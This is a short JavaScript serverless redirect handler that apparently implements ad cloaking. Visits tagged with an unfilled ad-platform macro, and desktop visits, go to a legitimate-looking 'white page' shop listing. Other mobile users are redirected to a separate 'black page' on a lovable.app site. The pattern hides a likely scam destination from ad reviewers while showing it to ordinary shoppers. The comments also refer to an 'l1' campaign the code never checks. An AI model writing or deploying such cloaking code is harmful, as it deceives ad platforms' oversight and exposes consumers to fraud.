export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://pricedumb.com.au/products/10-pack-20cm-short-data-charger-charging-usb-type-c-phone-tablet-cable-cord-bulk?gad_source=1&gad_campaignid=22442662489&gbraid=0AAAAAoK_Z8fdpUrgyzlWkYROuy7OabDbH&gclid=CjwKCAiAoNbIBhB5EiwAZFbYGJ1NzBbGKl-xnP07_3KrT0FEtwLUqkItNTUnQ4z-pXbaIcvGcE13ZxoCnSoQAvD_BwE";
    const blackPageURL = "https://luvcshap.lovable.app/?";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();

  }



























